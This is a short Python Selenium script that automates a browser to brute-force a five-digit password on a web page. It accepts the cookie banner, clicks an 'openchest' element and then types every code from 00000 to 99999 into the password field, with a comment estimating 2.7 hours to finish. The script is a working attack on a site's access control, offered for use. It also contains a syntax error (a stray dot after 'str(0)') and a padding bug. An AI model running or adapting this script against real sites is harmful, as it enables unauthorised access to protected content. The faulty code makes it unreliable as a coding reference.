from selenium import webdriver
from selenium.webdriver.common.by import By
import time
if __name__ == '__main__':
    browser = webdriver.Chrome('/Users/sergey/Downloads/chromedriver')
    #GETTING PATH TO THE INPUT
    browser.get('PAGE_LINK')
    acceptcookies = browser.find_element(By.XPATH, "//*[@id=\"onetrust-button-group\"]/div")
    time.sleep(2)
    acceptcookies.click()
    time.sleep(2)
    openchest = browser.find_element(By.XPATH, "//*[@id=\"17028ccd-b2c5-4aeb-95a3-4352e6177893\"]/div")
    time.sleep(2)
    openchest.click()
    time.sleep(2)
    passwordfield = browser.find_element(By.XPATH, "//*[@id=\"slide-password-wrapper-ca9b7634-e002-40f2-b6c3-cca0ad285c3d\"]/div/div/div/form/div/div[1]/input")
    time.sleep(2)                      
    #START OF BRUTEFORCING 
    time.sleep(2)
    for i in range(0, 100000):
        t = i #Temp. variable to count number of digits needed to be cover with zeroes
        c = 5 #Number of zeroes set to 5 from the scrath
        while (t != 0):
            t //= 10    #Counting digits needed to be covered with zeroes
            c -= 1
        s = ""
        for j in range(0, c):
            s += str(0).       #Covering needed digits with zeroes 
        s += str(i)+'\n'      
        passwordfield.send_keys(s)    #This string method of sending keys fasters brute forcing 
        for j in range(1, 10):        #To make sure that the field is cleared.
            passwordfield.clear()

  #LETS COUNT BRUTE FORCING TIME... CHEKING ONE PASSWORD TAKES AROUND 0.1S, SO THAT 5 DIGIT PASSWORD WILL BE BRUTE FORCED IN 0.1S*1E5/60/60 = 2.7 HOURS.








